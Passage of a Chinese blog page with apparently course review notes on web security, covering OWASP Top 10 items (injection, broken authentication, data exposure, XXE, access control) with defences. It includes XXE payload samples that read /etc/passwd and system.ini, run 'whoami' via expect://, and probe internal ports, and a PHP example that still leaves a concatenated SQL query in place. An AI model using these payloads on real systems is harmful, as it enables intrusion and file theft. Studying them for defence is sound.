<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="网络攻防复习, 秋月日常">
    <meta name="description" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>网络攻防复习 | 秋月日常</title>
    <link rel="icon" type="image/png" href="/meizi.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 5.4.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="秋月日常" type="application/atom+xml">
</head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/qiuyue.jpg" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">秋月日常</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/qiuyue.jpg" class="logo-img circle responsive-img">
        
        <div class="logo-name">秋月日常</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/lcy5201314/lcy5201314.github.io" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/lcy5201314/lcy5201314.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">网络攻防复习</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/CUMT/">
                                <span class="chip bg-color">CUMT</span>
                            </a>
                        
                            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
                                <span class="chip bg-color">网络安全</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/%E7%BD%91%E5%AE%89/" class="post-category">
                                网安
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2022-05-25
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2022-05-28
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    18.7k
                </div>
                

                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="网络攻防复习"><a href="#网络攻防复习" class="headerlink" title="网络攻防复习"></a>网络攻防复习</h1><blockquote>
<p>作者： 李春阳</p>
</blockquote>
<hr>
<p><strong><em>目录</em></strong></p>
<p>[TOC]</p>
<hr>
<h2 id="web安全"><a href="#web安全" class="headerlink" title="web安全"></a>web安全</h2><h3 id="OWASP-TOP-10"><a href="#OWASP-TOP-10" class="headerlink" title="OWASP TOP 10"></a>OWASP TOP 10</h3><p>开放式Web应用程序安全项目(OWASP,Open Web Application Security Project)是一个非盈利的全球性安全组织，致力于应用软件的安全研究。</p>
<ul>
<li>A1:2017-注入</li>
<li>A2:2017-失效的身份认证</li>
<li>A3:2017-敏感信息泄漏</li>
<li>A4:2017-XML外部实体(XXE)[新]</li>
<li>A5:2017-失效的访问控制[合并]</li>
<li>A6:2017-安全配置错误</li>
<li>A7:2017-跨站脚本(XSS)</li>
<li>A8:2017-不安全的反序列化[新，来自于社区]</li>
<li>A9:2017-使用含有己知漏洞的组件</li>
<li>A10:2017-不足的日志记录和监控[新，来自于社区]</li>
</ul>
<h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><strong>什么是注入：</strong>将不受信任的数据作为命令或查询的一部分发送到解析器时，注入漏洞产生。</p>
<p><strong>注入导致的后果：</strong>攻击可以诱使解析器在没有适当授权的情况下执行非预期命令或访问数据，包括：</p>
<ul>
<li><p>导致数据丢失、破坏或泄露给无授权方，缺乏可审计性或拒绝服务</p>
</li>
<li><p>甚至能导致主机被完全接管</p>
</li>
</ul>
<p><strong>注入位置：</strong>通常发生在SQL、LDAP(基于X.500标准的轻量级目录访问协议) Xpath(在XML文档中查找信息的语言)或NoSQL查询语句、OS命令、ML解析器、SMTP包头、表达式语句及ORM查询语句中</p>
<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><h5 id="注入的防御"><a href="#注入的防御" class="headerlink" title="注入的防御"></a>注入的防御</h5><p><strong>sql注入的预防：</strong>将数据与命令、查询分割开来。</p>
<ol>
<li><p>使用安全的API（避免使用解释器，参数接口化）</p>
</li>
<li><p>白名单的服务器输入验证</p>
</li>
<li><p>使用解释器的特定转义语法转义特殊字符</p>
</li>
</ol>
<h5 id="sql注入的防御"><a href="#sql注入的防御" class="headerlink" title="sql注入的防御"></a>sql注入的防御</h5><ul>
<li><p>对输入数据进行校验</p>
<ul>
<li>对非法数据转化为合法化（空格等转码）</li>
<li>拒绝预知的非法输入（黑名单）</li>
<li>只接受已知的合法输入（白名单）</li>
</ul>
</li>
<li><p>使用ORM或者框架技术</p>
</li>
<li><p>对输入的数据进行编码或数据校验</p>
<ul>
<li><code>is_numeric()</code>判断数据类型</li>
<li>对<code>'</code>进行转义<code>/'</code></li>
</ul>
</li>
<li><p>使用预编译语句</p>
</li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span>
<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"username"</span><span class="token punctuation">;</span>
<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"password"</span><span class="token punctuation">;</span>
<span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"myDB"</span><span class="token punctuation">;</span>
 
<span class="token comment">// 创建连接</span>
<span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//输入ID，	GET</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">//$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";</span>
<span class="token comment">//$result=mysql_query($sql);</span>
<span class="token comment">//$row = mysql_fetch_array($result);</span>
<span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id= ? LIMIT 0,1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$stmt</span><span class="token operator">-&gt;</span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$stmt</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="失效的身份验证"><a href="#失效的身份验证" class="headerlink" title="失效的身份验证"></a>失效的身份验证</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p><strong>什么是失效的身份验证：</strong>通过错误使用应用程序的身份认证和会话管理功能，攻击者能够破译密码、密钥或会话令牌，或利用其他开发缺陷来暂时性或永久性冒充其他用户的身份。</p>
<p><strong>导致失效身份验证的原因：</strong></p>
<ul>
<li><p>暴力破解、凭证填充</p>
</li>
<li><p>使用简单密码</p>
</li>
<li>使用弱的或失效的验证凭证恢复程序、忘记密码程序</li>
<li>使用明文、加密的或弱散列算法的密码</li>
<li><p>缺少或失效的多因素身份验证</p>
</li>
<li><p>暴露用户敏感信息</p>
</li>
<li><p>URL暴露会话ID或者不跟新，不正确使用会话ID</p>
</li>
</ul>
<h4 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h4><p><strong>如何防止失效的身份验证：</strong></p>
<ul>
<li><p>多因素身份验证</p>
</li>
<li><p>不要使用任何默认凭据进行发布或部署(禁止使用root权限)</p>
</li>
<li><p>执行弱密码检查</p>
</li>
<li><p>设置安全的密码和制定安全的密码保护协议，定期轮换</p>
</li>
<li><p>限制或增加失败的登陆延时，保护会话ID，异常检测并记录</p>
</li>
</ul>
<h3 id="敏感数据泄露"><a href="#敏感数据泄露" class="headerlink" title="敏感数据泄露"></a>敏感数据泄露</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p><strong>敏感数据泄露的后果：</strong>攻击者可以通过窃取或修改未加密的数据来实施信用卡诈骗、身份盗窃或其他犯罪行为。（获取敏感信息个人信息）</p>
<p><strong>敏感数据加密：</strong>传输过程中的数据（明文）、存储的数据（未加密）、浏览器的交互数据</p>
<h4 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h4><p><strong>如何防止敏感数据泄露：</strong></p>
<ul>
<li><p>进行数据分类，进行访问控制</p>
</li>
<li><p>对敏感数据进行加密，定期清理不必要的临时敏感数据</p>
</li>
<li>更新最新的加密算法和参数，协议，密钥，和密码专用算法存储密码，如PBKDF2，bcrypt，scrypt</li>
<li><p>确保传输过程中数据加密（使用TLS）</p>
</li>
<li><p>禁止缓存包含敏感数据的相应</p>
</li>
</ul>
<h3 id="XML外部实体（XXE）"><a href="#XML外部实体（XXE）" class="headerlink" title="XML外部实体（XXE）"></a>XML外部实体（XXE）</h3><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p><strong>什么是XXE：</strong>如果可以上传XML文档或在XML文档中添加恶意内容，通过易受攻击的代码、依赖项，攻击者就能够攻击含有缺陷的XML处理器。</p>
<p><strong>XXE攻击的后果：</strong>攻击者可以利用外部实体窃取使用URI文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施DoS攻击。</p>
<h4 id="XML结构介绍"><a href="#XML结构介绍" class="headerlink" title="XML结构介绍"></a>XML结构介绍</h4><p><strong>什么是XML：</strong>可拓展标记语言，类似HTML，设计宗旨时传输数据，而非显示数据，XML标签没有被预定义。需要自行定义标签。</p>
<p><strong>XML文档包含：</strong>XML声明、DTD文档类型定义（可选）、文档元素。</p>
<p><strong>XXE实体分类：</strong>字符实体、命名实体、参数实体、外部实体</p>
<p>实体分类：</p>
<ul>
<li><p>字符实体：由XML规范预先定义好了</p>
<p>| 实体引用 | 字符 |<br>| :———: | :—: |<br>|   &amp;lt    |  &lt;   |<br>|   &amp;gt    |  &gt;   |<br>|   &amp;amp   |  &amp;   |<br>|  &amp;quot   |  “   |<br>|  &amp;apos   |  ‘   |</p>
</li>
<li><p><strong>命名实体</strong>与数字字符实体类似，只是将数字改为一个更容易记忆的英文标识.其中<code>&lt;!ENTITY... &gt;</code>表示实体声明，<code>&lt;!ENTITY &gt;</code>就是对一大段内容的引用，可以简化代码的复用。</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token comment">&lt;!-- XML声明 --&gt;</span>
<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span> <span class="token punctuation">[</span><span class="token internal-subset">
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">x</span> <span class="token attr-name">"CUMT"</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">y</span> <span class="token attr-name">"bxs"</span><span class="token punctuation">&gt;</span></span>
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;x;">&amp;x;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>y</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;y;">&amp;y;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>y</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<ul>
<li><p>参数实体</p>
<p><strong>combine.dtd</strong></p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ENTITY content "%param1;%param2;%param3"&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><strong>xml</strong></p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token comment">&lt;!-- XML声明 --&gt;</span>
<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span> <span class="token punctuation">[</span><span class="token internal-subset">
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">param1</span> <span class="token attr-name">"CUMT"</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">param2</span> <span class="token attr-name">"bxs"</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">param3</span> <span class="token attr-name">"bxs"</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">dtd</span> <span class="token attr-name">STSTEM</span> <span class="token attr-name">"combine.dtd"</span><span class="token punctuation">&gt;</span></span>
	%dtd
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foo</span><span class="token punctuation">&gt;</span></span>&amp;content<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foo</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<ul>
<li>外部实体</li>
</ul>
<p>XML声明+DTD文档+文档元素</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token comment">&lt;!-- XML声明 --&gt;</span>
<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>

<span class="token comment">&lt;!-- DTD 文档类型说明 --&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">PAYLOAD</span> <span class="token punctuation">[</span><span class="token internal-subset">
<span class="token comment">&lt;!--这里声明了变量，类型是什么--&gt;</span>
	<span class="token comment">&lt;!-- 内部 --&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">name</span> <span class="token attr-name">"name"</span><span class="token punctuation">&gt;</span></span>
	<span class="token comment">&lt;!-- 外部 --&gt;</span>
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!-- 文档元素--&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;name;">&amp;name;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>payload</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>payload</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="攻击代码"><a href="#攻击代码" class="headerlink" title="攻击代码"></a>攻击代码</h4><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE ANY [
读取任意文件
&lt;!ENTITY xxe SYSTEM "file:///C:/windows/system.ini"&gt;
执行系统命令
&lt;!ENTITY xxe SYSTEM "expect://whoami"&gt;
探测内网端口
&lt;!ENTITY xxe SYSTEM "http://192.x.x.x:81/xx"&gt;
攻击内网网站
当跳板类似1和3.
]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h4><p><strong>如何防止XXE攻击：</strong></p>
<ul>
<li><p>尽可能使用简单的数据格式，并面对敏感数据进行序列化</p>
</li>
<li><p>及时修护更新使用的XML处理器和库</p>
</li>
<li><p>在XML解析器中禁用XML外部实体和DTD进程</p>
</li>
<li><p>在服务器实施白名单过滤</p>
</li>
<li><p>使用SAST工具进行检测，使用API安全网关，WAF检测等预防XXE攻击</p>
</li>
</ul>
<h3 id="失效的访问控制"><a href="#失效的访问控制" class="headerlink" title="失效的访问控制"></a>失效的访问控制</h3><h4 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h4><p><strong>什么是失效的访问控制：</strong>未对用户实施恰当的访问控制。攻击者可以访问未经授权的功能或数据。</p>
<p><strong>造成的危害：</strong>访问其他用户账户、查看敏感文件、修改其他用户的数据、更改访问权限</p>
<p><strong>示例</strong>：web参数查询，随意访问</p>
<h4 id="防御-4"><a href="#防御-4" class="headerlink" title="防御"></a>防御</h4><p><strong>如何防范：</strong></p>
<ul>
<li><p>除共有资源外，默认为“拒绝访问”</p>
</li>
<li><p>使用一次性的访问控制机制，最小化跨源资源访问</p>
</li>
<li><p>禁用web服务器目录列表，备份文件另存为</p>
</li>
<li><p>在日志中记录失败的访问控制</p>
</li>
<li><p>当用户注销后，服务器上的状态会话标识符应失效</p>
</li>
<li><p>对访问控制功能进行单元测试和集成测试</p>
</li>
</ul>
<h3 id="安全配置错误"><a href="#安全配置错误" class="headerlink" title="安全配置错误"></a>安全配置错误</h3><h4 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h4><p><strong>安全配置错误通常包括哪些：</strong></p>
<ul>
